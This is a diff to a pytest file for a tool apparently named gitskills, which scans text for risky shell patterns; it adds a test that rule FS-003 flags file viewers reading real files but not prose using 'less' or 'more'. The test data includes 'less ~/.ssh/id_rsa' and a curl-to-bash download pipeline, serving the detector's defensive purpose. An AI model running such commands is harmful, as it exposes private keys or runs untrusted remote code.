@@ -2,6 +2,7 @@
 
 import pytest
 
+from gitskills.analysis.analyzer import SkillAnalyzer
 from gitskills.analysis.models import RiskCategory
 from gitskills.rules.base import RegexRule
 from gitskills.rules.registry import DEFAULT_RULES
@@ -110,3 +111,17 @@ def test_download_pipeline_supports_explicit_line_continuation():
     )
     assert all(len(rule.evaluate(text)) == 1 for text in examples)
     assert rule.evaluate("curl https://example.test/install.sh\n| bash") == ()
+
+
+def test_file_read_viewers_require_file_shaped_arguments_not_ordinary_prose():
+    analyzer = SkillAnalyzer()
+    prose = analyzer.scan(
+        "This is more exposed than a normal application. "
+        "The value is less than expected; see more information below."
+    )
+    assert "FS-003" not in prose.rule_counts()
+
+    actual = analyzer.scan("less ~/.ssh/id_rsa\nmore ./README\nmore report.txt")
+    assert actual.rule_counts()["FS-003"] == 3
+    assert any(e.raw_text == "less ~/.ssh/id_rsa" and "FS-003" in e.rule_ids
+               for e in actual.evidence)
